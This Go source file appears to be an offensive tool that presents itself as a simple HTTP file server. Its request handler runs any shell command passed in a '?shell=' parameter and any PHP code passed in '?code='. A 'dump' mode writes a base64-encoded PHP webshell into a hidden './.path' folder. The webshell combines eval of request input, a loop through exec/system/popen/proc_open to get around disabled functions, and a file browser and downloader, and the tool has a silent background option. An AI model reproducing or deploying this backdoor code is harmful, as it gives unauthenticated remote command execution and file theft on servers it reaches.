package main

import (
    "fmt"
    "log"
    "net"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "net/url"
    "strconv"
    "runtime"
    "strings"
    "encoding/base64"
)

type myHandler struct {
    http.Dir
    shellCmd string
    code string
}
func parseQuery(query string) (map[string][]string, error) {
    values := make(map[string][]string)
    pairs := strings.Split(query, "&")
    for _, pair := range pairs {
        parts := strings.SplitN(pair, "=", 2)
        if len(parts) != 2 {
            return nil, fmt.Errorf("invalid query parameter: %s", pair)
        }
        key := parts[0]
        value := parts[1]
        values[key] = append(values[key], value)
    }
    return values, nil
}
func (h myHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    // fmt.Println(r.URL.RawQuery)
    var output []byte
    var err error
    queryValues, err := parseQuery(r.URL.RawQuery)
    if err != nil {
        // http.Error(w, err.Error(), http.StatusBadRequest)
        // return
    }
    if cmd, ok := queryValues[h.shellCmd]; ok {
        cmdValue := cmd[0]
        // 对cmdValue进行url解码
        decodedStr, err := url.QueryUnescape(cmdValue)
        if err != nil {
            // handle error
        }
        cmdValue = decodedStr
        if runtime.GOOS == "windows" {
            output, err = exec.Command("cmd", "/c", cmdValue).Output()
        } else {
            output, err = exec.Command(cmdValue).Output()
        }
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
        fmt.Fprintf(w, "%s", output)
        return
    }

    if shellcode, ok := queryValues[h.code]; ok {
        shellcodeValue := shellcode[0]
        decodedStr, err := url.QueryUnescape(shellcodeValue)
        if err != nil {
            http.Error(w, err.Error(), http.StatusBadRequest)
            return
        }
        shellcodeValue = decodedStr
        if runtime.GOOS == "windows" {
            output, err = exec.Command("cmd", "/c", "php", "-r", shellcodeValue).Output()
        } else {
            output, err = exec.Command("php", "-r", "\""+shellcodeValue+"\"").Output()
        }
        if err != nil {
            http.Error(w, err.Error(), http.StatusInternalServerError)
            return
        }
        fmt.Fprintf(w, "%s", output)
        return
    }

    http.FileServer(h).ServeHTTP(w, r)
}

func getLocalIPs() []string {
    ips := []string{}
    ifaces, err := net.Interfaces()
    if err != nil {
        log.Fatal(err)
    }
    for _, iface := range ifaces {
        addrs, err := iface.Addrs()
        if err != nil {
            log.Fatal(err)
        }
        for _, addr := range addrs {
            ipnet, ok := addr.(*net.IPNet)
            if ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
                ips = append(ips, ipnet.IP.String())
            }
        }
    }
    return ips
}

func banner(ip string, port int, shellCmd string,Dir string,code string) {
    fmt.Printf(`
      _    _ _______ _______ _____   _____                             ______      ____
     | |  | |__   __|__   __|  __ \ / ____|                           / ____ \    / __ \
     | |__| |  | |     | |  | |__) | (___   ___ _ ____   _____ _ __  / /  __\_\  / /  \ \
     |  __  |  | |     | |  |  ___/ \___ \ / _ \ '__\ \ / / _ \ '__|| |  |_  \  | |    | |
     | |  | |  | |     | |  | |     ____) |  __/ |   \ V /  __/ |    \ \___/ /   \ \__/ /
     |_|  |_|  |_|     |_|  |_|    |_____/ \___|_|    \_/ \___|_|     \_____/     \____/
                https://github.com/tinyibird/httpservergo 

   Options:
         -h,        --help             show this help message and exit
         -p PORT,   --port=PORT        自定义端口（默认：8080）
         -d DIR,    --dir=DIR          自定义目录（默认：当前目录）
         -s SHELL,  --shell=SHELL      自定义Shell路径（默认：/?shell=）
         -cs CODE,  --code-shell SHELL 定义Shell路径（默认：/?shell=）
         -m mod,    --mod=MOD          自定义模式（php/java）
         --payload payload             自定义Shell内容（默认：php为：<?php eval($_POST['a']);  java为：
         --silent                      不产生命令行后台静默运行

   in directory %s
   serving on http://%s:%d
   shell on http://%s:%d/?%s=COMMAND
   webshell on http://%s:%d/?%s=CODE

`, filepath.Base(Dir), ip, port, ip, port, shellCmd , ip , port , code)
}
// <?php

//     $disabled_functions = explode(',', ini_get('disable_functions')); // 获取被禁用的函数列表
    
//     $available_functions = array(); // 初始化可用函数列表
    
//     // 定义命令执行函数列表
//     $command_functions = array(
//         'exec',
//         'system',
//         'passthru',
//         'shell_exec',
//         'popen',
//         'proc_open',
//         'pcntl_exec',
//         'systema',
//         'proc_close',
//         'proc_terminate',
//         'shell_execa'
//     );
    
//     // 检查命令执行函数是否被禁用，如果没有被禁用则添加到可用函数列表
//     foreach ($command_functions as $function) {
//         if (!in_array($function, $disabled_functions)) {
//             $available_functions[] = $function;
//         }
//     }
    
//     // 对每个可用函数进行执行，如果执行成功则停止后续函数的执行
//     $executed = false;
//     foreach ($available_functions as $function) {
//         if (isset($_REQUEST['a']) && !$executed) {
//             $output = '';
//             switch ($function) {
//                 case 'exec':
//                     exec($_REQUEST['a'], $output);
//                     break;
    
//                 case 'system':
//                     system($_REQUEST['a'], $output);
//                     break;
    
//                 case 'passthru':
//                     ob_start();
//                     passthru($_REQUEST['a']);
//                     $output = ob_get_clean();
//                     break;
    
//                 case 'shell_exec':
//                     $output = shell_exec($_REQUEST['a']);
//                     break;
    
//                 case 'popen':
//                     $fp = popen($_REQUEST['a'], 'r');
//                     if ($fp) {
//                         $output = '';
//                         while (!feof($fp)) {
//                             $output .= fgets($fp, 1024);
//                         }
//                         pclose($fp);
//                     }
//                     break;
    
//                 case 'proc_open':
//                     $descriptorspec = array(
//                         0 => array('pipe', 'r'),  // 标准输入
//                         1 => array('pipe', 'w'),  // 标准输出
//                     );
//                     $process = proc_open($_REQUEST['a'], $descriptorspec, $pipes);
//                     if (is_resource($process)) {
//                         fclose($pipes[0]);  // 关闭标准输入管道
//                         $output = stream_get_contents($pipes[1]);  // 读取标准输出
//                         fclose($pipes[1]);
//                         proc_close($process);  // 关闭进程
//                     }
//                     break;
    
//                 case 'pcntl_exec':
//                     pcntl_exec($_REQUEST['a']);
//                     break;
    
//                 case 'systema':
//                     system($_REQUEST['a'], $output);
//                     break;
    
//                 case 'proc_close':
//                     $process = proc_open($_REQUEST['a'], array(), $pipes);
//                     if (is_resource($process)) {
//                         proc_close($process);
//                         $output = 'Process closed';
//                     } else {
//                         $output = 'Failed to close process';
//                     }
//                     break;
    
//                 case 'proc_terminate':
//                     $process = proc_open($_REQUEST['a'], array(), $pipes);
//                     if (is_resource($process)) {
//                         proc_terminate($process);
//                         $output = 'Process terminated';
//                     } else {
//                         $output = 'Failed to terminate process';
//                     }
//                     break;
    
//                 case 'shell_execa':
//                     $output = shell_exec($_REQUEST['a']);
//                     break;
//             }
    
//             // 如果执行成功，则设置标志变量并输出结果
//             if ($output !== false) {
//                 $executed = true;
//                 echo $output;
//             }
//         }
//     }

// <?php

// // 设置要浏览的根目录
// $root_path = '/path/to/root/directory';

// // 获取当前目录
// $current_path = isset($_GET['path']) ? $_GET['path'] : '';

// // 防止目录遍历攻击
// $current_path = realpath($root_path . '/' . $current_path);

// // 检查当前目录是否存在，如果不存在则返回404错误
// if (!file_exists($current_path)) {
//   header('HTTP/1.0 404 Not Found');
//   exit;
// }

// // 列出当前目录中的所有文件和子目录
// $files = scandir($current_path);

// // 输出HTML页面头部
// echo '<!DOCTYPE html>
// <html>
// <head>
//   <title>文件浏览器</title>
//   <style>
//     table {
//       border-collapse: collapse;
//     }
//     th, td {
//       border: 1px solid black;
//       padding: 5px;
//     }
//     th {
//       background-color: #ddd;
//     }
//     a {
//       text-decoration: none;
//     }
//     a:hover {
//       text-decoration: underline;
//     }
//   </style>
// </head>
// <body>
//   <h1>文件浏览器</h1>
//   <p>当前目录：' . htmlspecialchars($current_path, ENT_QUOTES) . '</p>
//   <table>
//     <thead>
//       <tr>
//         <th>名称</th>
//         <th>大小</th>
//         <th>修改时间</th>
//         <th>操作</th>
//       </tr>
//     </thead>
//     <tbody>';

// // 遍历文件和子目录，并输出表格行
// foreach ($files as $file) {
//   // 忽略隐藏文件和上级目录
//   if ($file[0] === '.') {
//     continue;
//   }

//   $file_path = $current_path . '/' . $file;
//   $file_size = is_file($file_path) ? filesize($file_path) : '';
//   $file_time = is_file($file_path) ? date('Y-m-d H:i:s', filemtime($file_path)) : '';

//   echo '<tr>
//           <td>' . htmlspecialchars($file, ENT_QUOTES) . '</td>
//           <td>' . htmlspecialchars($file_size) . '</td>
//           <td>' . htmlspecialchars($file_time) . '</td>
//           <td>';

//   if (is_file($file_path)) {
//     // 如果是文件，输出下载链接
//     echo '<a href="' . htmlspecialchars('?path=' . urlencode($current_path) . '&file=' . urlencode($file)) . '">下载</a>';
//   } else {
//     // 如果是目录，输出链接到子目录
//     echo '<a href="' . htmlspecialchars('?path=' . urlencode($current_path . '/' . $file)) . '">进入</a>';
//   }

//   echo '</td>
//         </tr>';
// }

// // 输出HTML页面尾部
// echo '</tbody>
//   </table>
// </body>
// </html>';

// // 如果请求包含文件参数，则下载文件
// if (isset($_GET['file'])) {
//   $file_path = $current_path . '/' . $_GET['file'];

//   // 检查文件是否存在，如果不存在则返回404错误
//   if (!file_exists($file_path)) {
//     header('HTTP/1.0 404 Not Found');
//     exit;
//   }

//   // 设置响应头部，实现文件下载
//   header('Content-Type: application/octet-stream');
//   header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
//   header('Content-Length: ' . filesize($file_path));
//   readfile($file_path);
//   exit;
// }
func dump_shell(mod string,cmd string,code string,shellcode string,dir string,ip string ,port int){
    // javashell:=""
    path:="./.path"
    
    
    err := os.Mkdir(path, 0755)
    if err != nil {
        log.Fatal(err)
    }
    switch mod{
    case "php":
        phpcmd:="PD9waHAKICAgICRkaXNhYmxlZF9mdW5jdGlvbnMgPSBleHBsb2RlKCcsJywgaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKSk7IAogICAgJGF2YWlsYWJsZV9mdW5jdGlvbnMgPSBhcnJheSgpOyAKICAgICRjb21tYW5kX2Z1bmN0aW9ucyA9IGFycmF5KAogICAgICAgICdleGVjJywKICAgICAgICAnc3lzdGVtJywKICAgICAgICAncGFzc3RocnUnLAogICAgICAgICdzaGVsbF9leGVjJywKICAgICAgICAncG9wZW4nLAogICAgICAgICdwcm9jX29wZW4nLAogICAgICAgICdwY250bF9leGVjJywKICAgICAgICAnc3lzdGVtYScsCiAgICAgICAgJ3Byb2NfY2xvc2UnLAogICAgICAgICdwcm9jX3Rlcm1pbmF0ZScsCiAgICAgICAgJ3NoZWxsX2V4ZWNhJwogICAgKTsKICAgIAogICAgZm9yZWFjaCAoJGNvbW1hbmRfZnVuY3Rpb25zIGFzICRmdW5jdGlvbikgewogICAgICAgIGlmICghaW5fYXJyYXkoJGZ1bmN0aW9uLCAkZGlzYWJsZWRfZnVuY3Rpb25zKSkgewogICAgICAgICAgICAkYXZhaWxhYmxlX2Z1bmN0aW9uc1tdID0gJGZ1bmN0aW9uOwogICAgICAgIH0KICAgIH0KICAgIAogICAgJGV4ZWN1dGVkID0gZmFsc2U7CiAgICBmb3JlYWNoICgkYXZhaWxhYmxlX2Z1bmN0aW9ucyBhcyAkZnVuY3Rpb24pIHsKICAgICAgICBpZiAoaXNzZXQoJF9SRVFVRVNUWydhJ10pICYmICEkZXhlY3V0ZWQpIHsKICAgICAgICAgICAgJG91dHB1dCA9ICcnOwogICAgICAgICAgICBzd2l0Y2ggKCRmdW5jdGlvbikgewogICAgICAgICAgICAgICAgY2FzZSAnZXhlYyc6CiAgICAgICAgICAgICAgICAgICAgZXhlYygkX1JFUVVFU1RbJ2EnXSwgJG91dHB1dCk7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAKICAgICAgICAgICAgICAgIGNhc2UgJ3N5c3RlbSc6CiAgICAgICAgICAgICAgICAgICAgc3lzdGVtKCRfUkVRVUVTVFsnYSddLCAkb3V0cHV0KTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgIAogICAgICAgICAgICAgICAgY2FzZSAncGFzc3RocnUnOgogICAgICAgICAgICAgICAgICAgIG9iX3N0YXJ0KCk7CiAgICAgICAgICAgICAgICAgICAgcGFzc3RocnUoJF9SRVFVRVNUWydhJ10pOwogICAgICAgICAgICAgICAgICAgICRvdXRwdXQgPSBvYl9nZXRfY2xlYW4oKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgIAogICAgICAgICAgICAgICAgY2FzZSAnc2hlbGxfZXhlYyc6CiAgICAgICAgICAgICAgICAgICAgJG91dHB1dCA9IHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydhJ10pOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgCiAgICAgICAgICAgICAgICBjYXNlICdwb3Blbic6CiAgICAgICAgICAgICAgICAgICAgJGZwID0gcG9wZW4oJF9SRVFVRVNUWydhJ10sICdyJyk7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRmcCkgewogICAgICAgICAgICAgICAgICAgICAgICAkb3V0cHV0ID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICghZmVvZigkZnApKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkb3V0cHV0IC49IGZnZXRzKCRmcCwgMTAyNCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcGNsb3NlKCRmcCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgCiAgICAgICAgICAgICAgICBjYXNlICdwcm9jX29wZW4nOgogICAgICAgICAgICAgICAgICAgICRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAwID0+IGFycmF5KCdwaXBlJywgJ3InKSwgCiAgICAgICAgICAgICAgICAgICAgICAgIDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLCAKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICRwcm9jZXNzID0gcHJvY19vcGVuKCRfUkVRVUVTVFsnYSddLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7CiAgICAgICAgICAgICAgICAgICAgaWYgKGlzX3Jlc291cmNlKCRwcm9jZXNzKSkgewogICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHBpcGVzWzBdKTsgIAogICAgICAgICAgICAgICAgICAgICAgICAkb3V0cHV0ID0gc3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pOyAKICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCRwaXBlc1sxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHByb2NfY2xvc2UoJHByb2Nlc3MpOyAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAKICAgICAgICAgICAgICAgIGNhc2UgJ3BjbnRsX2V4ZWMnOgogICAgICAgICAgICAgICAgICAgIHBjbnRsX2V4ZWMoJF9SRVFVRVNUWydhJ10pOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgCiAgICAgICAgICAgICAgICBjYXNlICdzeXN0ZW1hJzoKICAgICAgICAgICAgICAgICAgICBzeXN0ZW0oJF9SRVFVRVNUWydhJ10sICRvdXRwdXQpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgCiAgICAgICAgICAgICAgICBjYXNlICdwcm9jX2Nsb3NlJzoKICAgICAgICAgICAgICAgICAgICAkcHJvY2VzcyA9IHByb2Nfb3BlbigkX1JFUVVFU1RbJ2EnXSwgYXJyYXkoKSwgJHBpcGVzKTsKICAgICAgICAgICAgICAgICAgICBpZiAoaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHByb2NfY2xvc2UoJHByb2Nlc3MpOwogICAgICAgICAgICAgICAgICAgICAgICAkb3V0cHV0ID0gJ1Byb2Nlc3MgY2xvc2VkJzsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkb3V0cHV0ID0gJ0ZhaWxlZCB0byBjbG9zZSBwcm9jZXNzJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAKICAgICAgICAgICAgICAgIGNhc2UgJ3Byb2NfdGVybWluYXRlJzoKICAgICAgICAgICAgICAgICAgICAkcHJvY2VzcyA9IHByb2Nfb3BlbigkX1JFUVVFU1RbJ2EnXSwgYXJyYXkoKSwgJHBpcGVzKTsKICAgICAgICAgICAgICAgICAgICBpZiAoaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHByb2NfdGVybWluYXRlKCRwcm9jZXNzKTsKICAgICAgICAgICAgICAgICAgICAgICAgJG91dHB1dCA9ICdQcm9jZXNzIHRlcm1pbmF0ZWQnOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRvdXRwdXQgPSAnRmFpbGVkIHRvIHRlcm1pbmF0ZSBwcm9jZXNzJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAKICAgICAgICAgICAgICAgIGNhc2UgJ3NoZWxsX2V4ZWNhJzoKICAgICAgICAgICAgICAgICAgICAkb3V0cHV0ID0gc2hlbGxfZXhlYygkX1JFUVVFU1RbJ2EnXSk7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRvdXRwdXQgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAkZXhlY3V0ZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgZWNobyAkb3V0cHV0OwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQ=="
        shell_php:=""
        if shellcode ==""{
            cmdshell, err := base64.StdEncoding.DecodeString(phpcmd)
            if err != nil {
                fmt.Println("Error decoding base64:", err)
                return
            }
            explorer:="JGN1cnJlbnRfcGF0aCA9IGlzc2V0KCRfR0VUWydwYXRoJ10pID8gJF9HRVRbJ3BhdGgnXSA6ICcnOwoKLy8g6Ziy5q2i55uu5b2V6YGN5Y6G5pS75Ye7CiRjdXJyZW50X3BhdGggPSByZWFscGF0aCgkcm9vdF9wYXRoIC4gJy8nIC4gJGN1cnJlbnRfcGF0aCk7CgovLyDmo4Dmn6XlvZPliY3nm67lvZXmmK/lkKblrZjlnKjvvIzlpoLmnpzkuI3lrZjlnKjliJnov5Tlm540MDTplJnor68KaWYgKCFmaWxlX2V4aXN0cygkY3VycmVudF9wYXRoKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwogIGV4aXQ7Cn0KCi8vIOWIl+WHuuW9k+WJjeebruW9leS4reeahOaJgOacieaWh+S7tuWSjOWtkOebruW9lQokZmlsZXMgPSBzY2FuZGlyKCRjdXJyZW50X3BhdGgpOwoKLy8g6L6T5Ye6SFRNTOmhtemdouWktOmDqAplY2hvICc8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogIDx0aXRsZT7mlofku7bmtY/op4jlmag8L3RpdGxlPgogIDxzdHlsZT4KICAgIHRhYmxlIHsKICAgICAgYm9yZGVyLWNvbGxhcHNlOiBjb2xsYXBzZTsKICAgIH0KICAgIHRoLCB0ZCB7CiAgICAgIGJvcmRlcjogMXB4IHNvbGlkIGJsYWNrOwogICAgICBwYWRkaW5nOiA1cHg7CiAgICB9CiAgICB0aCB7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICNkZGQ7CiAgICB9CiAgICBhIHsKICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgfQogICAgYTpob3ZlciB7CiAgICAgIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogICAgfQogIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgPGgxPuaWh+S7tua1j+iniOWZqDwvaDE+CiAgPHA+5b2T5YmN55uu5b2V77yaJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGN1cnJlbnRfcGF0aCwgRU5UX1FVT1RFUykgLiAnPC9wPgogIDx0YWJsZT4KICAgIDx0aGVhZD4KICAgICAgPHRyPgogICAgICAgIDx0aD7lkI3np7A8L3RoPgogICAgICAgIDx0aD7lpKflsI88L3RoPgogICAgICAgIDx0aD7kv67mlLnml7bpl7Q8L3RoPgogICAgICAgIDx0aD7mk43kvZw8L3RoPgogICAgICA8L3RyPgogICAgPC90aGVhZD4KICAgIDx0Ym9keT4nOwoKLy8g6YGN5Y6G5paH5Lu25ZKM5a2Q55uu5b2V77yM5bm26L6T5Ye66KGo5qC86KGMCmZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgewogIC8vIOW/veeVpemakOiXj+aWh+S7tuWSjOS4iue6p+ebruW9lQogIGlmICgkZmlsZVswXSA9PT0gJy4nKSB7CiAgICBjb250aW51ZTsKICB9CgogICRmaWxlX3BhdGggPSAkY3VycmVudF9wYXRoIC4gJy8nIC4gJGZpbGU7CiAgJGZpbGVfc2l6ZSA9IGlzX2ZpbGUoJGZpbGVfcGF0aCkgPyBmaWxlc2l6ZSgkZmlsZV9wYXRoKSA6ICcnOwogICRmaWxlX3RpbWUgPSBpc19maWxlKCRmaWxlX3BhdGgpID8gZGF0ZSgnWS1tLWQgSDppOnMnLCBmaWxlbXRpbWUoJGZpbGVfcGF0aCkpIDogJyc7CgogIGVjaG8gJzx0cj4KICAgICAgICAgIDx0ZD4nIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZSwgRU5UX1FVT1RFUykgLiAnPC90ZD4KICAgICAgICAgIDx0ZD4nIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZV9zaXplKSAuICc8L3RkPgogICAgICAgICAgPHRkPicgLiBodG1sc3BlY2lhbGNoYXJzKCRmaWxlX3RpbWUpIC4gJzwvdGQ+CiAgICAgICAgICA8dGQ+JzsKCiAgaWYgKGlzX2ZpbGUoJGZpbGVfcGF0aCkpIHsKICAgIC8vIOWmguaenOaYr+aWh+S7tu+8jOi+k+WHuuS4i+i9vemTvuaOpQogICAgZWNobyAnPGEgaHJlZj0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoJz9wYXRoPScgLiB1cmxlbmNvZGUoJGN1cnJlbnRfcGF0aCkgLiAnJmZpbGU9JyAuIHVybGVuY29kZSgkZmlsZSkpIC4gJyI+5LiL6L29PC9hPic7CiAgfSBlbHNlIHsKICAgIC8vIOWmguaenOaYr+ebruW9le+8jOi+k+WHuumTvuaOpeWIsOWtkOebruW9lQogICAgZWNobyAnPGEgaHJlZj0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoJz9wYXRoPScgLiB1cmxlbmNvZGUoJGN1cnJlbnRfcGF0aCAuICcvJyAuICRmaWxlKSkgLiAnIj7ov5vlhaU8L2E+JzsKICB9CgogIGVjaG8gJzwvdGQ+CiAgICAgICAgPC90cj4nOwp9CgovLyDovpPlh7pIVE1M6aG16Z2i5bC+6YOoCmVjaG8gJzwvdGJvZHk+CiAgPC90YWJsZT4KPC9ib2R5Pgo8L2h0bWw+JzsKCi8vIOWmguaenOivt+axguWMheWQq+aWh+S7tuWPguaVsO+8jOWImeS4i+i9veaWh+S7tgppZiAoaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsKICAkZmlsZV9wYXRoID0gJGN1cnJlbnRfcGF0aCAuICcvJyAuICRfR0VUWydmaWxlJ107CgogIC8vIOajgOafpeaWh+S7tuaYr+WQpuWtmOWcqO+8jOWmguaenOS4jeWtmOWcqOWImei/lOWbnjQwNOmUmeivrwogIGlmICghZmlsZV9leGlzdHMoJGZpbGVfcGF0aCkpIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwogICAgZXhpdDsKICB9CgogIC8vIOiuvue9ruWTjeW6lOWktOmDqO+8jOWunueOsOaWh+S7tuS4i+i9vQogIGhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsKICBoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInIC4gYmFzZW5hbWUoJGZpbGVfcGF0aCkgLiAnIicpOwogIGhlYWRlcignQ29udGVudC1MZW5ndGg6ICcgLiBmaWxlc2l6ZSgkZmlsZV9wYXRoKSk7CiAgcmVhZGZpbGUoJGZpbGVfcGF0aCk7CiAgZXhpdDsKfQ=="
            explor, err := base64.StdEncoding.DecodeString(explorer)
            if err != nil {
                fmt.Println("Error decoding base64:", err)
                return
            }
            shell_php = "<?php eval($_REQUEST['"+code+"']);?>"+string(cmdshell)+"$root_path='"+dir+"';"+string(explor)
        }else{
            shell_php = shellcode
        }
        file, err := os.Create(path+"/index.php")
        if err != nil {
            log.Fatal(err)
        }
        defer file.Close()

        _, err = file.WriteString(shell_php)
        if err != nil {
            log.Fatal(err)
        }
        if runtime.GOOS =="windows"{
            exec.Command("cmd","/c","php","-d","allow_url_include=On","-t","./.path/","-S",ip+":"+strconv.Itoa(port))
        }else{
            exec.Command("php","-d","allow_url_include=On","-t","./.path/","-S",ip+":"+strconv.Itoa(port))
        }
    case "java":
        // shell_java:=""
        fmt.Println("java mod 目前暂不支持dump_shell")
        os.Exit(0)
    }
}

func main() {
    port := 8080
    dir, _ := os.Getwd()
    shellCmd := "shell"
    code := "code"
    payload := ""
    mod := ""
    silent:=0
    dump:=0
    for i := 1; i < len(os.Args); i++ {
        arg := os.Args[i]
        switch arg {
        case "-h", "--help":
            silent = 1
            fmt.Println("HTTP Server")
            fmt.Println("Usage:")
            fmt.Println("  httpserver [OPTIONS]")
            fmt.Println("")
            fmt.Println("Application Options:")
            fmt.Println("  -h,        --help             show this help message and exit")
            fmt.Println("  -p PORT,   --port PORT        自定义端口（默认：8080）")
            fmt.Println("  -d DIR,    --dir DIR          自定义目录（默认：当前目录）")
            fmt.Println("  -s SHELL,  --shell SHELL      自定义Shell路径（默认：/?shell=）")
            fmt.Println("  -cs CODE,  --code-shell SHELL 定义Shell路径（默认：/?code=）")
            fmt.Println("  -m mod,    --mod MOD          自定义模式（php/java/.net）(目前不落地的shell只支持php)")
            fmt.Println("  --payload payload             自定义Shell内容（默认：php为：<?php eval($_POST['a']);  java为：）")
            fmt.Println("  --silent                      不产生命令行后台静默运行")
            fmt.Println("  -dump,     --dumpshell        将shell落地执行产生对应的shell进程,所有功能都将通过落地的shell执行(暂不支持java)")
            fmt.Println("")
            fmt.Println("Help Options:")
            fmt.Println("  -h, --help  Show this help message and exit")
            os.Exit(0)
        case "-p", "--port":
            port, _ = strconv.Atoi(os.Args[i+1])
            // fmt.Println(port)
            i++
        case "-d", "--dir":
            dir = os.Args[i+1]
            // fmt.Println(dir)
            i++
        case "-s", "--shell":
            shellCmd = os.Args[i+1]
            // fmt.Println(shellCmd)
            i++
        case "-cs", "--code-shell":
            code = os.Args[i+1]
            i++
        case "-m", "--mod":
            mod =os.Args[i+1]
            // fmt.Println(mod)
            i++
        case "-payload":
            payload =os.Args[i+1]
            // fmt.Println(payload)
            i++
        case "--silent":
            silent = 1
        case "-dump", "--dumpshell":
            dump = 1
        default:
            fmt.Println("Unknown option:", arg)
        }
    }

    ips := getLocalIPs()
    // ip:=ips[0]
    ip:="127.0.0.1"
    if len(ips) == 0 {
        fmt.Println("No network interfaces found.")
        os.Exit(1)
    }
    if silent == 0{
        banner(ip, port, shellCmd, dir, code)
    }
    if dump == 0{
        h := myHandler{http.Dir(dir), shellCmd , code}
        err := http.ListenAndServe(fmt.Sprintf(":%d", port), h)
        if err != nil {
            log.Fatal(err)
        }
    }else{
        dump_shell(mod,shellCmd,code,payload,dir,ip,port)
    }
}